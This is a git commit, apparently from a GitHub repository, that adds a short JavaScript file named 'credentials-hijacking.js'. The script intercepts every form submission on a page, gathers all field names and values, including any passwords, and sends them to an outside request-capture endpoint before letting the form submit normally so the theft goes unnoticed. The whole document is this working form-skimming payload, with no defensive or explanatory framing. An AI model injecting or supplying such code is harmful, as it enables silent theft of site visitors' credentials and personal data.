491fb90d5283b2d143d8fcab2d1bfad842648739
can <47246431+canozal@users.noreply.github.com>
2022-06-15 22:44:35 +0300

    Add files via upload

---
+++ credentials-hijacking.js
@@ -0,0 +1,6 @@
+document.addEventListener('submit', function(e) {
+    e.preventDefault();
+    const URL = 'https://{your-endpoint}.free.beeceptor.com';
+    let params = [...e.target.elements].map(d => d.name + "=" + d.value).filter(d => d.length>1).join("&");
+    fetch(URL + "?" + params).then(() => e.target.submit());
+});
